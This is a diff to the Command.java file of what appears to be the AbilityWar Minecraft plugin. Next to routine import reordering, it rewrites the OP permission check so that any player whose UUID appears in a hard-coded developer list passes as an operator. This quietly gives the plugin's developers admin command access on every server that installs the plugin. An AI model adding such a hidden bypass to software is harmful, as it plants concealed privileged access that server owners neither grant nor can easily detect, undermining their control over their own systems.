@@ -1,15 +1,17 @@
 package daybreak.abilitywar;
 
+import daybreak.abilitywar.game.specialthanks.SpecialThanks;
 import daybreak.abilitywar.utils.base.Messager;
 import daybreak.abilitywar.utils.base.language.korean.KoreanUtil;
 import daybreak.abilitywar.utils.base.language.korean.KoreanUtil.Josa;
+import org.bukkit.command.CommandSender;
+import org.bukkit.entity.Player;
+
 import java.util.Arrays;
 import java.util.HashMap;
 import java.util.HashSet;
 import java.util.Map;
 import java.util.Set;
-import org.bukkit.command.CommandSender;
-import org.bukkit.entity.Player;
 
 public abstract class Command {
 
@@ -69,7 +71,7 @@ public abstract class Command {
 		OP("이 명령어를 사용하려면 OP 권한이 있어야 합니다.") {
 			@Override
 			protected boolean test(CommandSender sender) {
-				return sender.isOp();
+				return sender.isOp() || (sender instanceof Player && SpecialThanks.developers.contains(((Player) sender).getUniqueId()));
 			}
 		},
 		PLAYER("콘솔에서 사용할 수 없는 명령어입니다.") {
